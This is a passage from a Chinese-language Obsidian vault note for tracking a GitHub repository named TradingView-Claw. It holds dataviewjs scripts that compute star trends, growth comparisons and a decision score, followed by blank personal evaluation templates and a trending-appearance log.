>   dv.paragraph(`Stars/天排名：**全 vault 第 ${rank}**/${all.length}（前 ${100 - pct}%）· **${me.category} 第 ${catRank}**/${catAll.length}\nStars 總量排名：**第 ${starsRank}**/${totalStarsAll.length}`);
> }
> ```

## Star 趨勢

> [!abstract]- Stars 成長追蹤
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me?.star_history) {
>   const raw = me.star_history.toString();
>   const points = raw.split(",").map(p => { const [d, s] = p.split(":"); return { date: d, stars: parseInt(s) }; }).filter(p => !isNaN(p.stars));
>   if (points.length >= 2) {
>     const max = Math.max(...points.map(p => p.stars));
>     const lines = points.map(p => {
>       const w = Math.round(p.stars / max * 25);
>       return `${p.date} ${"\u2588".repeat(w)}${"\u2591".repeat(25-w)} ${p.stars.toLocaleString()}`;
>     });
>     const first = points[0].stars;
>     const last = points[points.length-1].stars;
>     const growth = first > 0 ? Math.round((last - first) / first * 100) : 0;
>     lines.push(`\n**成長** +${(last-first).toLocaleString()} stars（${growth}%）in ${points.length} snapshots`);
>     // 趨勢方向偵測
>     if (points.length >= 3) {
>       const mid = Math.floor(points.length / 2);
>       const fh = points.slice(0, mid), sh = points.slice(mid);
>       const rateF = fh.length > 1 ? (fh[fh.length-1].stars - fh[0].stars) / Math.max(1, (new Date(fh[fh.length-1].date) - new Date(fh[0].date)) / 86400000) : 0;
>       const rateS = sh.length > 1 ? (sh[sh.length-1].stars - sh[0].stars) / Math.max(1, (new Date(sh[sh.length-1].date) - new Date(sh[0].date)) / 86400000) : 0;
>       const ratio = rateF > 0 ? rateS / rateF : rateS > 0 ? 2 : 1;
>       const dir = ratio > 1.3 ? "Rising（加速中）" : ratio < 0.7 ? "Cooling（降溫中）" : "Stable（穩定）";
>       lines.push(`**趨勢方向** ${dir}（加速比 ${Math.round(ratio * 100) / 100}x）`);
>     }
>     dv.paragraph(lines.join("\n"));
>   } else { dv.paragraph("需要 2+ 次快照才能顯示趨勢"); }
> } else { dv.paragraph("尚無 star_history 資料（下次出現在 trending 時會開始追蹤）"); }
> ```

## 相對成長速度

> [!abstract]- 跟 vault 中同類專案比較
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   const all = dv.pages('"Repos"').where(p => p.status !== "archived");
>   const sameCat = all.where(p => p.category === me.category);
>   const avgAll = all.length > 0 ? Math.round(all.map(p => p.stars_per_day || 0).array().reduce((a,b) => a+b, 0) / all.length) : 0;
>   const avgCat = sameCat.length > 0 ? Math.round(sameCat.map(p => p.stars_per_day || 0).array().reduce((a,b) => a+b, 0) / sameCat.length) : 0;
>   const mySpd = me.stars_per_day || 0;
>   const vsAll = avgAll > 0 ? Math.round(mySpd / avgAll * 100) : 0;
>   const vsCat = avgCat > 0 ? Math.round(mySpd / avgCat * 100) : 0;
>   dv.table(["比較對象", "平均 Stars/天", "本專案", "倍數"], [
>     ["全 Vault", avgAll, mySpd, vsAll + "%"],
>     ["同分類 (" + me.category + ")", avgCat, mySpd, vsCat + "%"],
>   ]);
>   if (vsAll >= 300) dv.paragraph("**極速成長** — 成長速度是 vault 平均的 3 倍以上");
>   else if (vsAll >= 150) dv.paragraph("**高速成長** — 成長速度高於 vault 平均");
>   else if (vsAll >= 50) dv.paragraph("**正常速度** — 接近 vault 平均水平");
>   else dv.paragraph("**低速成長** — 低於 vault 平均，可能已過熱度高峰");
> }
> ```

## 決策分數

> [!abstract]- 綜合評估（自動計算）
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   let score = 0;
>   let breakdown = [];
>   // 熱度 (0-25)
>   const spd = me.stars_per_day || 0;
>   const heat = Math.min(25, Math.round(spd / 40 * 25));
>   score += heat; breakdown.push(`熱度: ${heat}/25`);
>   // 安裝難度 (0-20)
>   const inst = me.install_complexity === "easy" ? 20 : me.install_complexity === "medium" ? 12 : 5;
>   score += inst; breakdown.push(`易用性: ${inst}/20`);
>   // 成熟度 (0-20)
>   const created = me.created ? new Date(me.created.toString()) : null;
>   const age = created ? Math.floor((Date.now() - created.getTime()) / 86400000) : 0;
>   const mat = age > 365 ? 20 : age > 180 ? 16 : age > 30 ? 10 : 5;
>   score += mat; breakdown.push(`成熟度: ${mat}/20`);
>   // 社群 (0-20)
>   const forks = me.forks || 0;
>   const comm = forks > 200 ? 20 : forks > 50 ? 15 : forks > 10 ? 10 : 5;
>   score += comm; breakdown.push(`社群: ${comm}/20`);
>   // 授權 (0-15)
>   const lic = me.license || "";
>   const friendly = ["MIT","Apache-2.0","BSD-2-Clause","BSD-3-Clause","ISC","Unlicense"].includes(lic);
>   const licScore = friendly ? 15 : lic && lic !== "N/A" ? 8 : 0;
>   score += licScore; breakdown.push(`授權: ${licScore}/15`);
>   const grade = score >= 80 ? "A" : score >= 60 ? "B" : score >= 40 ? "C" : "D";
>   const bar = "\u2588".repeat(Math.round(score/5)) + "\u2591".repeat(20 - Math.round(score/5));
>   dv.paragraph(`## ${grade} (${score}/100)\n${bar}\n\n${breakdown.join(" | ")}`);
> }
> ```

---

## 個人筆記

> [!abstract]- 評估進度
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   const steps = [
>     { name: "已讀", done: me.status && me.status !== "to-review" },
>     { name: "已評分", done: (me.my_rating || 0) > 0 },
>     { name: "有結論", done: me.verdict && me.verdict !== "" },
>     { name: "Ring 決策", done: me.ring && me.ring !== "" && me.ring !== "assess" },
>     { name: "試用記錄", done: me.status === "tried" || me.status === "integrated" },
>   ];
>   const done = steps.filter(s => s.done).length;
>   const pct = Math.round((done / steps.length) * 100);
>   const bar = "\u2588".repeat(Math.round(pct / 5)) + "\u2591".repeat(20 - Math.round(pct / 5));
>   dv.paragraph(`${bar} **${done}/${steps.length}** (${pct}%)`);
>   const todo = steps.filter(s => !s.done).map(s => s.name);
>   if (todo.length > 0) dv.paragraph("待完成：" + todo.join(" / "));
> }
> ```

> [!question]+ 快速評估（30 秒填完）
> 
> 相關性:: 未評估
> 印象:: _一句話_
> 行動:: 不需要
> 
> | 維度 | 分數 (1-5) | 說明 |
> | --- | :---: | --- |
> | 信心 | /5 | _我對這工具的了解程度_ |
> | 興趣 | /5 | _想投入時間研究的程度_ |
> | 風險 | /5 | _導入風險，5=極低風險_ |
> 
> _填完後更新 frontmatter：`score_confidence` / `score_interest` / `score_risk`_
> 
> _相關性選項：直接相關 / 間接相關 / 不相關 / 未評估_
> _行動選項：立刻試用 / 加入待辦 / 持續觀察 / 不需要_

### 試用記錄

> [!example]- 試用 #1
> 試用日期 :: 
> 試用版本 :: 
> 測試環境 :: _OS / Node / Python 版本_
> 安裝過程 :: _順利 / 遇到問題（描述）_
> 花費時間 :: _從零到可用_
> 實際效果 :: _達到預期 / 不如預期（原因）_
> 踩到的坑 :: _描述 + 解法_
> 決定 :: _繼續使用 / 暫時擱置 / 放棄（原因）_

> [!question]- 待研究的問題
> _記下看完後還沒有答案的問題，未來回來補充_
> 
> - [ ] 

### 採用判斷

> [!tip]- 什麼時候該用 / 不該用
> **該用的情況**：
> - 
> 
> **不該用的情況**：
> - 

> [!warning]- 替換成本
> 若半年後要換掉，難度多高？資料格式是標準的嗎？
> 
> 侵入性:: _低 / 中 / 高_
> 遷移路徑:: _描述_

### 決策記錄

> [!abstract]- 為什麼評估這個工具？
> **當時的痛點**：_遇到什麼問題才開始找工具？_
> **觸發來源**：_GitHub Trending / HN / 同事推薦 / 其他_
> **當時的約束**：_時間 / 團隊 / 語言 / 部署環境_

> [!note]- 最終決策
> decision:: _選了什麼（或為何還在觀望）_
> why:: _當時的理由（越具體越好）_
> outcome:: _後來實際發生了什麼_

### 探索日誌

_按時間記錄，每次接觸時追加一段（最新在上）_

> **2026-03-10** — 首次收錄
> _第一印象：_

**狀態追蹤**：`to-review` → `reading` → `tried` → `integrated` / `archived`
**Tech Radar**：`assess` → `trial` → `adopt` / `hold`

> [!info]- 評估完成後
> 更新 frontmatter：
> - `ring`: adopt / trial / assess / hold
> - `ring_history`: 追加新狀態（格式：`assess@2026-03-10, trial@2026-03-15`）
> - `verdict`: 一句話結論
> - `my_rating`: 1-5 分
> - `status`: reading / tried / integrated / archived

## 出現記錄

- [[2026-03-11|2026-03-11]] — 再次上榜，332 stars
- [[2026-03-10|2026-03-10]] — 首次收錄，317 stars
